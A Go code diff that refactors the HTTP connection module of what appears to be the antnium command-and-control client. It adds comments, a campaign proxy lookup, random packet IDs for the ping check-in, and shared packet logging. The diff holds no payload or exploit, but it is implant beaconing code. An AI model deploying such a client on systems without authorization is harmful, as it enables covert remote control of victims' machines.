@@ -4,18 +4,22 @@ import (
 	"bytes"
 	"fmt"
 	"io/ioutil"
+	"math/rand"
 	"net/http"
 	"net/url"
+	"strconv"
 	"time"
 
 	"github.com/dobin/antnium/pkg/campaign"
+	"github.com/dobin/antnium/pkg/common"
 	"github.com/dobin/antnium/pkg/model"
 	log "github.com/sirupsen/logrus"
 )
 
+// UpstreamWs is a connection to the server via REST
 type UpstreamHttp struct {
-	chanIncoming chan model.Packet
-	chanOutgoing chan model.Packet
+	chanIncoming chan model.Packet // Provides packets from server to client
+	chanOutgoing chan model.Packet // Consumes packets from client to server
 
 	state *ClientState
 	coder model.Coder
@@ -40,8 +44,9 @@ func MakeUpstreamHttp(config *ClientConfig, campaign *campaign.Campaign) Upstrea
 	return u
 }
 
+// Connect creates a REST connection to the server, or returns an error
 func (d *UpstreamHttp) Connect() error {
-	proxyUrl, ok := getProxy(d.campaign)
+	proxyUrl, ok := d.campaign.GetProxy()
 	if ok {
 		if proxyUrl, err := url.Parse(proxyUrl); err == nil && proxyUrl.Scheme != "" && proxyUrl.Host != "" {
 			proxyUrlFunc := http.ProxyURL(proxyUrl)
@@ -52,9 +57,10 @@ func (d *UpstreamHttp) Connect() error {
 		}
 	}
 
+	// Build a empty ping packet to test
 	arguments := make(model.PacketArgument)
 	response := make(model.PacketResponse)
-	packet := model.NewPacket("ping", d.config.ComputerId, "0", arguments, response)
+	packet := model.NewPacket("ping", d.config.ComputerId, strconv.Itoa(int(rand.Uint64())), arguments, response)
 	err := d.sendPacket(packet)
 	if err != nil {
 		log.WithFields(log.Fields{
@@ -63,17 +69,6 @@ func (d *UpstreamHttp) Connect() error {
 	}
 
 	return err
-}
-
-func (d *UpstreamHttp) Connected() bool {
-	return true
-}
-
-func (d *UpstreamHttp) ChanIncoming() chan model.Packet {
-	return d.chanIncoming
-}
-func (d *UpstreamHttp) ChanOutgoing() chan model.Packet {
-	return d.chanOutgoing
 }
 
 // Start is a Thread responsible for receiving packets from server, lifetime:app
@@ -153,14 +148,7 @@ func (d *UpstreamHttp) sendPacket(packet model.Packet) error {
 	// Setup response
 	packet.ComputerId = d.config.ComputerId
 
-	log.WithFields(log.Fields{
-		"1_computerId":   packet.ComputerId,
-		"2_packetId":     packet.PacketId,
-		"3_downstreamId": packet.DownstreamId,
-		"4_packetType":   packet.PacketType,
-		"5_arguments":    packet.Arguments,
-		"6_response":     "...",
-	}).Info("Send")
+	common.LogPacket("UpstreamHttp:send()", packet)
 
 	data, err := d.coder.EncodeData(packet)
 	if err != nil {
@@ -177,4 +165,16 @@ func (d *UpstreamHttp) sendPacket(packet model.Packet) error {
 	}
 
 	return nil
+}
+
+// Connected returns false if we know that that websocket connection is dead
+func (d *UpstreamHttp) Connected() bool {
+	return true
+}
+
+func (d *UpstreamHttp) ChanIncoming() chan model.Packet {
+	return d.chanIncoming
+}
+func (d *UpstreamHttp) ChanOutgoing() chan model.Packet {
+	return d.chanOutgoing
 }
